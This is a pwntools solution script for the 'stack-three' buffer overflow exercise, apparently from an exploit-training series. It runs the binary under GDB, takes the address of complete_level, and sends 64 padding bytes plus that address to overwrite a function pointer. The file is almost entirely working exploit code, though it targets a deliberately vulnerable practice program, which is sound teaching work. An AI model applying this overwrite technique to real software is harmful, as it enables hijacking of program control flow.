from binascii import hexlify
from pwn import *

# pwnlib.gdb docs https://docs.pwntools.com/en/stable/gdb.html
# GDB Python API docs https://sourceware.org/gdb/current/onlinedocs/gdb.html/Python-API.html
# RPyC docs https://rpyc.readthedocs.io/en/latest/
# Pwntools tutorial https://github.com/Gallopsled/pwntools-tutorial/blob/master/debugging.md

'''
build:
just build stack-three
 or
gcc stack-three.c -o stack-three -g


GDB Commands to pwn manually:
gdp stack-three --tui
break main
step # to line 40
info address complete_level
print locals.fp=0x########
'''

# Break on a specific line:
# https://stackoverflow.com/a/46980221
def breakpoint_line_offset(function_name, line_offset, gdb):
    """
    Calculates an absolute breakpoint location (file:linenumber)
    based on functionName and lineOffset
    """
    # get info about the file and line number where the function is defined
    info = gdb.execute("info line "+function_name, to_string=True)
    # extract file name and line number 
    m = re.match(r'Line[^\d]+(\d+)[^"]+"([^"]+)', info)
    if not m:
        raise Exception('Failed to find function %s.' % function_name)
    line = int(m.group(1))+line_offset #add the lineOffset
    fileName = m.group(2)
    return "%s:%d" % (fileName, line)


g = gdb.debug('./stack-three', api=True)
g.gdb.Breakpoint('main')

complete_level_addr = g.gdb.execute('x complete_level', to_string=True)
# print(f'x complete_level_addr={complete_level_addr}')
complete_level_addr = complete_level_addr.split()[0][2:]
# print(f'split complete_level_addr={complete_level_addr}')
complete_level_addr = bytes.fromhex(complete_level_addr)
# print(f'complete_level_addr={complete_level_addr}')
complete_level_addr = bytearray(complete_level_addr)
# print(f'bytearray complete_level_addr={complete_level_addr}')
complete_level_addr = complete_level_addr[::-1]
# print(f'reverse complete_level_addr={complete_level_addr}')

break_on_if_locals_fp = breakpoint_line_offset('complete_level', 15, g.gdb)
g.gdb.Breakpoint(break_on_if_locals_fp)
g.gdb.continue_and_wait()
g.gdb.continue_nowait()

print(g.readline())

padding = bytearray('A'*64, encoding="ascii")
exploit = padding + complete_level_addr
print(f'sending exploit={exploit}')

# print('sendline')
g.sendline(exploit)

# input('keeping gdb alive')
fp = g.gdb.execute('print locals.fp', to_string=True)
print(f'fp={fp}')

# print('continue_nowait')
g.gdb.continue_nowait()

# print('readline')
output = g.readline()
print(output)
assert output.split()[0] == b'calling'

# input('done. keeping gdb alive')
g.close()
